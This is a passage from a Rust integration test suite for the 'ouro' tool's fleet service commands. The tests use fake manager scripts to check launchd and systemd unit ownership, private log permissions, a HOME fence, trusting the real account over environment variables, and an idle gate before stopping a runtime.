    let strays = fs::read_dir(plan.unit_path().parent().expect("an agents dir"))
        .expect("a listing")
        .flatten()
        .filter(|entry| entry.file_name().to_string_lossy().starts_with('.'))
        .count();
    assert_eq!(strays, 0);
}

/// F14. A manager override that is not an executable file is refused by name, rather
/// than silently falling through to `PATH`.
#[test]
fn f14_a_manager_override_that_is_not_a_program_is_refused_by_name() {
    let root = scratch("from-env");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let home = root.join("home");
    fs::create_dir_all(&home).expect("a scratch home");

    for (value, why) in [
        (root.display().to_string(), "a directory"),
        ("relative/launchctl".to_string(), "a relative path"),
        ("/does/not/exist/launchctl".to_string(), "a missing file"),
    ] {
        let output = Command::new(OURO)
            .args(["fleet", "service", "status"])
            .env("OUROBOROS_DATA_DIR", &data_dir)
            .env("HOME", &home)
            .env_remove("XDG_CONFIG_HOME")
            .env("OUROBOROS_SERVICE_ROOT", &home)
            .env("OUROBOROS_LAUNCHCTL", &value)
            .output()
            .expect("the built ouro binary");
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        assert!(!output.status.success(), "{why} (`{value}`) was accepted");
        assert!(
            stderr.contains("OUROBOROS_LAUNCHCTL") && stderr.contains(&value),
            "{why}: {stderr}"
        );
    }
}

/// F15. A runtime already owning the data directory is a fact the operator is owed.
#[test]
fn f15_install_says_when_a_runtime_already_owns_this_data_directory() {
    let root = scratch("unmanaged");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let mut child = Command::new("/bin/sh")
        .args(["-c", "while :; do sleep 1; done"])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("a stand-in runtime");
    let pid = child.id() as i32;
    let birth = ouro::runtime::process_birth(pid)
        .expect("a readable incarnation")
        .expect("a live stand-in");
    write_private(
        &data_dir.join("runtime.owner"),
        &format!(r#"{{"pid":{pid},"owner":"someone","birth":"{birth}"}}"#),
    );

    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    let report = fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    assert!(
        report
            .notes
            .iter()
            .any(|note| note.contains("already owns") && note.contains(&pid.to_string())),
        "{:?}",
        report.notes
    );
    assert!(fleet_service::render(&report).contains("already owns"));
    let _ = child.kill();
    let _ = child.wait();
}

/// F17/L1. The marker is forgeable and says so. This pins both halves: the behaviour,
/// and the sentence in the documentation that stops anybody reading it as a boundary.
#[test]
fn f17_the_marker_is_not_a_security_boundary_and_the_documentation_says_so() {
    let root = scratch("forged");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    // Anything that can write the unit path can compute the marker: it is a digest over
    // the file with no secret in it. The classification is therefore `Ours`.
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
    let ours = fs::read_to_string(plan.unit_path()).expect("our unit");
    assert_eq!(
        fleet_service::classify(&plan).expect("a classification").0,
        Ownership::Ours
    );
    let _ = ours;

    // So the documentation has to say what it does and does not distinguish.
    let fleet_md = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("docs")
        .join("FLEET.md");
    let text = fs::read_to_string(&fleet_md).expect("docs/FLEET.md");
    assert!(
        text.contains("not a security boundary"),
        "docs/FLEET.md must say the ownership marker is not a security boundary"
    );
    assert!(
        text.contains("write access"),
        "and must say what it does not defend against"
    );
}

/// F18/L2/M17. The service's own logs are private, and stay private: recreated when
/// rotation removed them, and re-privatised when something created them world-readable.
#[test]
fn f18_the_service_logs_are_put_back_private_by_the_verbs_that_touch_them() {
    let root = scratch("log-rotate");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
    assert_eq!(mode(&plan.err_log()), 0o600);

    // Log rotation, or an operator clearing space.
    fs::remove_file(plan.err_log()).expect("a rotated log");
    fs::remove_file(plan.out_log()).expect("a rotated log");
    let report = fleet_service::status(&plan, &fakes.programs).expect("a status");
    assert!(
        plan.err_log().exists(),
        "status must put a missing log back"
    );
    assert_eq!(mode(&plan.err_log()), 0o600);
    assert!(
        report.notes.iter().any(|note| note.contains("recreated")),
        "{:?}",
        report.notes
    );

    fs::remove_file(plan.err_log()).expect("a rotated log");
    fleet_service::start(&plan, &fakes.programs).expect("a start");
    assert_eq!(mode(&plan.err_log()), 0o600);

    // A log the manager created at its own umask is made private again.
    fs::set_permissions(plan.err_log(), fs::Permissions::from_mode(0o644))
        .expect("a world-readable log");
    fleet_service::install(&plan, &fakes.programs, false).expect("a reinstall");
    assert_eq!(
        mode(&plan.err_log()),
        0o600,
        "an existing log is re-privatised, not trusted"
    );
}

/// F19/L5. Whose lingering is reported comes from the password database, not from an
/// environment variable anybody can set.
#[test]
fn f19_the_account_is_the_real_one_and_not_whatever_user_says() {
    let root = scratch("linger-user");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let home = root.join("home");
    fs::create_dir_all(&home).expect("a scratch home");

    let real = Command::new("/usr/bin/id")
        .arg("-un")
        .output()
        .expect("id -un");
    let real = String::from_utf8_lossy(&real.stdout).trim().to_string();

    let output = Command::new(OURO)
        .args(["fleet", "service", "status", "--json"])
        .env("OUROBOROS_DATA_DIR", &data_dir)
        .env("HOME", &home)
        .env_remove("XDG_CONFIG_HOME")
        .env("OUROBOROS_SERVICE_ROOT", &home)
        .env("USER", "somebody-else")
        .env("LOGNAME", "somebody-else")
        .env("OUROBOROS_LAUNCHCTL", &fakes.programs.launchctl)
        .env("OUROBOROS_SYSTEMCTL", &fakes.programs.systemctl)
        .env("OUROBOROS_LOGINCTL", &fakes.programs.loginctl)
        .output()
        .expect("the built ouro binary");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );

    let report: Value = serde_json::from_slice(&output.stdout).expect("a JSON report");
    assert!(!real.is_empty(), "this machine has an account name");
    assert_eq!(
        report["user"].as_str(),
        Some(real.as_str()),
        "the report names the account this process actually runs as: {report}"
    );
    assert!(
        !serde_json::to_string(&report)
            .expect("encodable")
            .contains("somebody-else"),
        "an account named only by the environment reached the report: {report}"
    );
}

/// M3 (mutation survivor). Our own marker, naming a *different* data directory, is
/// another runtime's unit and not ours to rewrite or delete.
#[test]
fn m3_our_marker_for_another_data_directory_is_foreign() {
    let root = scratch("other-marker");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let other = data_dir_with_profile(&root.join("other"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let mut theirs = plan.clone();
    theirs.data_dir = other.clone();
    let unit = plan.unit_path();
    fs::create_dir_all(unit.parent().expect("an agents dir")).expect("an agents dir");
    let text = theirs.render().expect("their unit");
    fs::write(&unit, &text).expect("their unit at our path");

    assert_eq!(
        fleet_service::classify(&plan).expect("a classification").0,
        Ownership::Foreign,
        "a marker naming {} is not a marker naming {}",
        other.display(),
        data_dir.display()
    );
    fleet_service::remove(&plan, &fakes.programs).expect_err("not ours");
    assert_eq!(fs::read_to_string(&unit).expect("theirs"), text);
    fleet_service::install(&plan, &fakes.programs, false).expect_err("not ours");
    assert_eq!(fs::read_to_string(&unit).expect("theirs"), text);
}

/// M10/M11 (mutation survivors). `remove` on nothing, `remove` on an edited unit, and
/// `disable` on somebody else's.
#[test]
fn m10_remove_and_disable_act_only_on_what_is_actually_there() {
    let root = scratch("ownership-verbs");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    // Nothing installed: a removal is a report, not a failure, and unlinks nothing.
    let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal of nothing");
    assert_eq!(report.ownership, Ownership::Absent);
    assert!(
        report
            .notes
            .iter()
            .any(|note| note.contains("did not exist")),
        "{:?}",
        report.notes
    );
    assert!(
        !report.steps.iter().any(|step| step.starts_with("removed ")),
        "nothing was there to remove: {:?}",
        report.steps
    );

    // Somebody else's file: `disable` will not stop what it supervises.
    let unit = plan.unit_path();
    fs::create_dir_all(unit.parent().expect("an agents dir")).expect("an agents dir");
    fs::write(&unit, "<plist/>\n").expect("a foreign unit");
    let error = fleet_service::disable(&plan, &fakes.programs).expect_err("not ours to stop");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("unit_foreign")
    );
    assert_eq!(fs::read_to_string(&unit).expect("theirs"), "<plist/>\n");

    // Ours, edited: `disable` is still allowed — stopping is reversible.
    fs::remove_file(&unit).expect("a removable foreign unit");
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
    let ours = fs::read_to_string(&unit).expect("our unit");
    fs::write(
        &unit,
        ours.replace("<integer>30</integer>", "<integer>7</integer>"),
    )
    .expect("an edit");
    let report = fleet_service::disable(&plan, &fakes.programs).expect("a disable");
    assert_eq!(report.ownership, Ownership::Modified);
    assert!(unit.exists(), "disable keeps the file");
}

/// M24 (mutation survivor). The unit file is still on disk at the moment the manager is
/// told to stop supervising it — the fakes record what they saw, so the order is
/// observed rather than asserted from the report.
#[test]
fn m24_the_unit_is_still_there_when_the_manager_is_told_to_stop_it() {
    let root = scratch("order");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fakes.watch(&plan);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    fakes.forget_calls();
    let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal");

    let bootout = fakes
        .calls()
        .into_iter()
        .find(|call| call.contains("bootout"))
        .expect("a bootout");
    assert!(
        bootout.ends_with("[unit=yes]"),
        "the unit was unlinked before its manager was told: {bootout}"
    );
    // And the report's own ordered log agrees.
    let ran = report
        .steps
        .iter()
        .position(|step| step.contains("bootout"))
        .expect("a recorded bootout");
    let removed = report
        .steps
        .iter()
        .position(|step| step.starts_with("removed "))
        .expect("a recorded removal");
    assert!(ran < removed, "{:?}", report.steps);
}

/// F21 (M7). Adopting a foreign plist boots out the job *that* plist loaded as well as
/// ours, so nothing is left running with no file behind it.
#[test]
fn f21_adopting_a_foreign_plist_boots_out_the_job_it_had_loaded() {
    let root = scratch("adopt-orphan");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let unit = plan.unit_path();
    fs::create_dir_all(unit.parent().expect("an agents dir")).expect("an agents dir");
    fs::write(
        &unit,
        "<?xml version=\"1.0\"?>\n<plist version=\"1.0\"><dict>\n<key>Label</key><string>com.example.other</string>\n<key>ProgramArguments</key><array><string>/usr/bin/true</string></array>\n<key>RunAtLoad</key><true/>\n</dict></plist>\n",
    )
    .expect("a foreign plist with its own label");

    fakes.forget_calls();
    let report = fleet_service::install(&plan, &fakes.programs, true).expect("an adopted install");

    let issued = format!("{:?}", report.commands);
    assert!(issued.contains(&plan.label()), "{issued}");
    assert!(
        issued.contains("com.example.other"),
        "the job the replaced file loaded has to be booted out too: {issued}"
    );
    assert!(
        report
            .notes
            .iter()
            .any(|note| note.contains("com.example.other")),
        "and named, so an operator knows what was stopped: {:?}",
        report.notes
    );
    // A label that is not a plausible launchd label is never handed to `launchctl`.
    fs::write(
        &unit,
        "<plist><dict><key>Label</key><string>two words</string></dict></plist>\n",
    )
    .expect("an implausible label");
    fakes.forget_calls();
    let report = fleet_service::install(&plan, &fakes.programs, true).expect("an adopted install");
    assert!(
        !format!("{:?}", report.commands).contains("two words"),
        "{:?}",
        report.commands
    );
}

// ------------------------------------------------------------- the idle gate, adversarially

/// F20 (M5). A runtime that does not serve `runtime.activity` has no gate to apply, and
/// is refused rather than stopped. Nothing is sent.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn f20_a_runtime_without_the_activity_method_is_refused_not_stopped() {
    let root = scratch("stop-old-runtime");
    let (listener, address) = support::listener().await;
    let runtime = FakeRuntime::new(&root, address.port());

    let token = runtime.token.clone();
    let server = tokio::spawn(async move {
        let mut peer = support::Peer::accept(&listener).await;
        // No `runtime.activity`: this runtime has no idea what an idle gate is.
        peer.hello_with_token(&token, &["hello", "runtime.shutdown"])
            .await;
        // Anything arriving here is a request that should never have been sent.
        if let Some(request) = peer.request().await {
            panic!("a request reached a runtime with no gate: {request}");
        }
    });

    let child = run_stop(&runtime, &["stop", "--require-idle"]).await;
    let (code, _stdout, stderr) = finish(child).await;
    server.abort();

    assert_eq!(code, Some(12), "stderr: {stderr}");
    assert!(stderr.contains("runtime.activity"), "{stderr}");
    assert!(stderr.contains("Nothing was sent"), "{stderr}");
    assert!(
        ouro::runtime::pid_alive(runtime.child.id() as i32),
        "nothing was stopped"
    );
}

/// F10 (L3). The JSON-RPC code is half the contract. A `reason` carried on some other
/// error is not the idle refusal and must not be reported as one.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn f10_a_reason_on_the_wrong_error_code_is_not_the_idle_refusal() {
    let root = scratch("stop-wrong-code");
    let (listener, address) = support::listener().await;
    let runtime = FakeRuntime::new(&root, address.port());

    let token = runtime.token.clone();
    let server = tokio::spawn(async move {
        let mut peer = support::Peer::accept(&listener).await;
        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
            .await;
        let request = peer.request().await.expect("a shutdown call");
        // -32601 is "method not found", not the contract's -32004.
        peer.error(
            &request["id"],
            -32601,
            "no such method",
            Some(json!({ "reason": "runtime_busy", "activity": "not an object at all" })),
        )
        .await;
        tokio::time::sleep(Duration::from_secs(2)).await;
    });

    let child = run_stop(&runtime, &["stop", "--require-idle"]).await;
    let (code, _stdout, stderr) = finish(child).await;
    server.abort();

    assert_eq!(
        code,
        Some(1),
        "an ordinary failure, not a busy runtime: {stderr}"
    );
    assert_ne!(code, Some(10));
    assert!(stderr.contains("runtime.shutdown failed"), "{stderr}");
}

/// F11 (L4). A connection that closes instead of answering an idle-gated stop leaves an
/// outcome nobody knows, and says so with its own exit code.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn f11_a_connection_dropped_mid_gate_is_an_unknown_outcome() {
    let root = scratch("stop-dropped");
    let (listener, address) = support::listener().await;
    let runtime = FakeRuntime::new(&root, address.port());

    let token = runtime.token.clone();
    let server = tokio::spawn(async move {
        let mut peer = support::Peer::accept(&listener).await;
        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
            .await;
        let _request = peer.request().await.expect("a shutdown call");
        // ...and then simply go away without answering.
        drop(peer);
    });

    let child = run_stop(&runtime, &["stop", "--require-idle"]).await;
    let (code, stdout, stderr) = finish(child).await;
    server.abort();

    assert_eq!(code, Some(13), "stdout: {stdout}\nstderr: {stderr}");
    assert!(stderr.contains("unknown"), "{stderr}");
    assert!(
        !stdout.contains("accepted runtime.shutdown"),
        "a dropped connection is not an acceptance: {stdout}"
    );

    // A plain `ouro stop` keeps its old meaning: the runtime may well stop before it can
    // answer, and that is the thing that was asked for.
    let (listener, address) = support::listener().await;
    let plain_root = scratch("stop-dropped-plain");
    let mut plain = FakeRuntime::new(&plain_root, address.port());
    let token = plain.token.clone();
    let (closed, closing) = tokio::sync::oneshot::channel();
    let server = tokio::spawn(async move {
        let mut peer = support::Peer::accept(&listener).await;
        peer.hello_with_token(&token, &["hello", "runtime.shutdown"])
            .await;
        let _request = peer.request().await.expect("a shutdown call");
        drop(peer);
        let _ = closed.send(());
    });
    let child = run_stop(&plain, &["stop"]).await;
    closing.await.expect("a closed connection");
    plain.stop_child();
    let (code, stdout, _stderr) = finish(child).await;
    server.abort();
    assert_eq!(code, Some(0));
    assert!(stdout.contains("closed the connection"), "{stdout}");
}

/// F16. A refusal answered to a *plain* stop is still a failure, not a swallowed one.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn f16_a_refusal_answered_to_a_plain_stop_is_not_swallowed() {
    let root = scratch("stop-plain-refusal");
    let (listener, address) = support::listener().await;
    let runtime = FakeRuntime::new(&root, address.port());

    let token = runtime.token.clone();
    let server = tokio::spawn(async move {
        let mut peer = support::Peer::accept(&listener).await;
        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
            .await;
        let request = peer.request().await.expect("a shutdown call");
        assert_eq!(
            request["params"],
            json!({}),
            "a plain stop sends no parameter"
        );
        peer.error(
            &request["id"],
            -32004,
            "this node is still working",
            Some(json!({ "reason": "runtime_busy", "activity": { "running_turns": 1 } })),
        )
        .await;
        tokio::time::sleep(Duration::from_secs(2)).await;
    });

    let child = run_stop(&runtime, &["stop"]).await;
    let (code, _stdout, stderr) = finish(child).await;
    server.abort();

    // Not 10: the gate was never asked for, so this is an ordinary refusal to report.
    assert_eq!(code, Some(1), "{stderr}");
    assert!(stderr.contains("runtime.shutdown failed"), "{stderr}");
    assert!(ouro::runtime::pid_alive(runtime.child.id() as i32));
}

/// L8. `systemctl --user enable` installs a `default.target.wants` symlink. Removing the
/// unit without taking that out leaves a dangling want for every later `daemon-reload`
/// to complain about — and on a machine whose user manager is not answering there is
/// nothing else left to clean it up.
#[test]
fn l8_remove_takes_out_the_wants_symlink_systemd_left_behind() {
    for reachable in [true, false] {
        let root = scratch("wants");
        let data_dir = data_dir_with_profile(&root.join("data"), "buildbox", "127.0.0.1");
        let fakes = Fakes::install(&root);
        let plan = plan_for(Platform::Linux, &root, &data_dir);
        fleet_service::install(&plan, &fakes.programs, false).expect("an install");

        // Exactly what the real `enable` leaves behind.
        let wants = plan
            .config_home
            .join("systemd")
            .join("user")
            .join("default.target.wants");
        fs::create_dir_all(&wants).expect("a wants directory");
        let want = wants.join(plan.manager_name());
        std::os::unix::fs::symlink(plan.unit_path(), &want).expect("an enable symlink");

        if !reachable {
            fakes.set("no_manager", true);
        }
        let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal");

        assert!(
            fs::symlink_metadata(&want).is_err(),
            "reachable={reachable}: {} is still there",
            want.display()
        );
        assert!(
            report
                .notes
                .iter()
                .any(|note| note.contains("default.target.wants")),
            "reachable={reachable}: {:?}",
            report.notes
        );
        assert!(!plan.unit_path().exists());
    }
}

/// H0. The property the whole fix rests on: this binary writes its unit under the `HOME`
/// it was given, and refuses outright to write outside the root it was fenced to.
#[test]
fn h0_a_child_writes_its_unit_under_the_home_it_was_given_and_nowhere_else() {
    let root = scratch("home-fence");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let home = root.join("home");
    fs::create_dir_all(&home).expect("a scratch home");

    // The unit path follows `$HOME`, not the account's own home directory.
    let output = Command::new(OURO)
        .args(["fleet", "service", "status", "--json"])
        .env("OUROBOROS_DATA_DIR", &data_dir)
        .env("HOME", &home)
        .env_remove("XDG_CONFIG_HOME")
        .env("OUROBOROS_SERVICE_ROOT", &home)
        .env("OUROBOROS_LAUNCHCTL", &fakes.programs.launchctl)
        .env("OUROBOROS_SYSTEMCTL", &fakes.programs.systemctl)
        .env("OUROBOROS_LOGINCTL", &fakes.programs.loginctl)
        .output()
        .expect("the built ouro binary");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let report: Value = serde_json::from_slice(&output.stdout).expect("a JSON report");
    let unit_path = report["unit_path"]
        .as_str()
        .expect("a unit path")
        .to_string();
    assert!(
        unit_path.starts_with(&home.display().to_string()),
        "a child told where its home is wrote to {unit_path}"
    );
    let real_home = dirs::home_dir().expect("a home directory");
    assert!(
        !unit_path.starts_with(&real_home.display().to_string()),
        "{unit_path} is inside the account's own home"
    );

    // And a home outside the fence is refused rather than written. This is the second,
    // independent guard: it does not care how the home was decided.
    let elsewhere = scratch("home-outside-fence");
    let output = Command::new(OURO)
        .args(["fleet", "service", "install"])
        .env("OUROBOROS_DATA_DIR", &data_dir)
        .env("HOME", &elsewhere)
        .env_remove("XDG_CONFIG_HOME")
        .env("OUROBOROS_SERVICE_ROOT", &home)
        .env("OUROBOROS_LAUNCHCTL", &fakes.programs.launchctl)
        .env("OUROBOROS_SYSTEMCTL", &fakes.programs.systemctl)
        .env("OUROBOROS_LOGINCTL", &fakes.programs.loginctl)
        .output()
        .expect("the built ouro binary");
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    assert!(!output.status.success(), "{stderr}");
    assert!(stderr.contains("OUROBOROS_SERVICE_ROOT"), "{stderr}");
    for directory in ["Library/LaunchAgents", ".config/systemd/user"] {
        assert_eq!(
            fs::read_dir(elsewhere.join(directory))
                .map(|entries| entries.count())
                .unwrap_or(0),
            0,
            "the fence has to refuse before anything is written into {directory}"
        );
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn disabling_a_managed_service_refuses_busy_work_before_any_manager_stop() {
    for platform in [Platform::MacOs, Platform::Linux] {
        let root = scratch("disable-busy");
        let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
        let fakes = Fakes::install(&root);
        let plan = plan_for(platform, &root, &data_dir);
        fleet_service::install(&plan, &fakes.programs, false).expect("an install");
        fakes.watch(&plan);

        let (listener, address) = support::listener().await;
        let runtime = FakeRuntime::new(&root, address.port());
        fakes.forget_calls();
        let token = runtime.token.clone();
        let server = tokio::spawn(async move {
            let mut peer = support::Peer::accept(&listener).await;
            peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
                .await;
            let request = peer.request().await.unwrap();
            assert_eq!(request["method"], "runtime.shutdown");
            assert_eq!(request["params"], json!({"require_idle": true}));
            peer.error(
                &request["id"],
                -32004,
                "busy",
                Some(json!({"reason": "runtime_busy", "activity": {"running_turns": 1}})),
            )
            .await;
            tokio::time::sleep(Duration::from_secs(5)).await;
        });
        let programs = fakes.programs.clone();
        let gated = plan.clone();
        let error = tokio::task::spawn_blocking(move || fleet_service::disable(&gated, &programs))
            .await
            .unwrap()
            .unwrap_err();
        server.abort();
        assert_eq!(
            fleet_service::service_error(&error).unwrap().reason,
            "runtime_busy"
        );
        assert!(ouro::runtime::pid_alive(runtime.child.id() as i32));
        assert!(
            !fakes
                .calls()
                .iter()
                .any(|call| call.contains("bootout") || call.contains("disable --now")),
            "{:?}",
            fakes.calls()
        );
        assert!(
            plan.unit_path().exists(),
            "a busy runtime must leave the unit file in place"
        );
    }
}

#[test]
fn disable_without_a_unit_does_not_touch_a_hand_started_runtime() {
    for platform in [Platform::MacOs, Platform::Linux] {
        let root = scratch("disable-absent");
        let listener = TcpListener::bind("127.0.0.1:0").expect("a listener");
        listener.set_nonblocking(true).expect("nonblocking");
        let runtime = FakeRuntime::new(&root, listener.local_addr().expect("a port").port());
        let fakes = Fakes::install(&root);
        let plan = plan_for(platform, &root, &runtime.data_dir);
        let report = fleet_service::disable(&plan, &fakes.programs).expect("a no-op disable");
        assert!(!report.installed);
        assert!(
            report
                .notes
                .iter()
                .any(|note| note.contains("not installed")),
            "{:?}",
            report.notes
        );
        assert!(
            listener.accept().is_err(),
            "disable must not call the gateway when no unit is installed"
        );
        assert!(
            !fakes
                .calls()
                .iter()
                .any(|call| call.contains("bootout") || call.contains("disable --now")),
            "{:?}",
            fakes.calls()
        );
        assert!(ouro::runtime::pid_alive(runtime.child.id() as i32));
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn removing_a_managed_service_refuses_busy_work_before_any_manager_stop() {
    for platform in [Platform::MacOs, Platform::Linux] {
        let root = scratch("remove-busy");
        let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
        let fakes = Fakes::install(&root);
        let plan = plan_for(platform, &root, &data_dir);
        fleet_service::install(&plan, &fakes.programs, false).expect("an install");
        fakes.watch(&plan);

        let (listener, address) = support::listener().await;
        let runtime = FakeRuntime::new(&root, address.port());
        fakes.forget_calls();
        let token = runtime.token.clone();
        let server = tokio::spawn(async move {
            let mut peer = support::Peer::accept(&listener).await;
            peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
                .await;
            let request = peer.request().await.unwrap();
            assert_eq!(request["method"], "runtime.shutdown");
            assert_eq!(request["params"], json!({"require_idle": true}));
            peer.error(
                &request["id"],
                -32004,
                "busy",
                Some(json!({"reason": "runtime_busy", "activity": {"running_turns": 1}})),
            )
            .await;
            tokio::time::sleep(Duration::from_secs(5)).await;
        });
        let programs = fakes.programs.clone();
        let gated = plan.clone();
        let error = tokio::task::spawn_blocking(move || fleet_service::remove(&gated, &programs))
            .await
            .unwrap()
            .unwrap_err();
        server.abort();
        assert_eq!(
            fleet_service::service_error(&error).unwrap().reason,
            "runtime_busy"
        );
        assert!(ouro::runtime::pid_alive(runtime.child.id() as i32));
        assert!(
            !fakes
                .calls()
                .iter()
                .any(|call| call.contains("bootout") || call.contains("disable --now")),
            "{:?}",
            fakes.calls()
        );
        assert!(
            plan.unit_path().exists(),
            "a busy runtime must leave the unit file in place"
        );
    }
}

#[test]
fn remove_on_an_already_stopped_runtime_proceeds() {
    let root = scratch("remove-stopped");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
    fakes.forget_calls();
    let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal");
    assert!(!report.installed);
    assert!(!plan.unit_path().exists());
    assert!(
        fakes.calls().iter().any(|call| call.contains("bootout")),
        "a stopped runtime still disables through the manager: {:?}",
        fakes.calls()
    );
}

#[test]
fn require_idle_stop_of_a_stopped_runtime_is_success() {
    let root = scratch("stop-absent");
    let data_dir = root.join("data");
    fs::create_dir_all(&data_dir).expect("a data directory");
    fs::set_permissions(&data_dir, fs::Permissions::from_mode(0o700)).expect("a private dir");
    let output = Command::new(OURO)
        .args(["stop", "--require-idle"])
        .env("OUROBOROS_DATA_DIR", &data_dir)
        .env_remove("OUROBOROS_GATEWAY_ADDR")
        .output()
        .expect("the built ouro binary");
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success(),
        "a stopped runtime is not a failure of the idle gate: {stderr}"
    );
    assert!(
        stdout.contains("nothing here to stop"),
        "stdout={stdout} stderr={stderr}"
    );
}

#[test]
fn installation_releases_the_spawn_lock_before_the_manager_can_start_a_runtime() {
    for platform in [Platform::MacOs, Platform::Linux] {
        let root = scratch("review-startup-lock");
        let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
        let fakes = Fakes::install(&root);
        let plan = plan_for(platform, &root, &data_dir);
        fs::write(
            fakes.state.join("spawn_lock_path"),
            data_dir
                .join(ouro::runtime::SPAWN_LOCK_FILE)
                .as_os_str()
                .as_encoded_bytes(),
        )
        .unwrap();
        let program = match platform {
            Platform::MacOs => &fakes.programs.launchctl,
            Platform::Linux => &fakes.programs.systemctl,
        };
        let script = fs::read_to_string(program).unwrap().replacen(
            "case \"$1\" in",
            r#"case "$1" in
  bootout)
    if [ ! -f "$(cat "$state/spawn_lock_path")" ]; then
      touch "$state/unlocked_stop"
    fi ;;
  bootstrap|enable)
    if [ -e "$(cat "$state/spawn_lock_path")" ]; then
      echo "the new runtime cannot acquire its spawn lock" >&2
      exit 70
    fi ;;
esac
case "$1" in"#,
            1,
        );
        write_script(program, &script);

        let report = fleet_service::install(&plan, &fakes.programs, false).unwrap();
        assert_eq!(report.running, Some(true));
        assert!(!fakes.state.join("unlocked_stop").exists());
    }
}

#[test]
fn reinstall_preserves_a_live_service_and_refuses_to_replace_it() {
    let root = scratch("review-reinstall");
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    listener.set_nonblocking(true).unwrap();
    let runtime = FakeRuntime::new(&root, listener.local_addr().unwrap().port());
    data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let mut plan = plan_for(Platform::MacOs, &root, &runtime.data_dir);
    fleet_service::install(&plan, &fakes.programs, false).unwrap();
    fakes.forget_calls();
    fleet_service::install(&plan, &fakes.programs, false).unwrap();
    let calls = fakes.calls();
    assert!(
        !calls
            .iter()
            .any(|call| call.starts_with("launchctl bootout")
                || call.starts_with("launchctl bootstrap")),
        "{calls:?}"
    );
    assert!(listener.accept().is_err(), "unexpected gateway request");
    let original = fs::read(plan.unit_path()).unwrap();
    plan.executable = PathBuf::from("/usr/bin/true");
    fakes.forget_calls();
    let error = fleet_service::install(&plan, &fakes.programs, false).unwrap_err();
    assert_eq!(
        fleet_service::service_error(&error).unwrap().reason,
        "runtime_running"
    );
    assert_eq!(fs::read(plan.unit_path()).unwrap(), original);
    assert!(!fakes
        .calls()
        .iter()
        .any(|call| call.starts_with("launchctl bootout")));
}
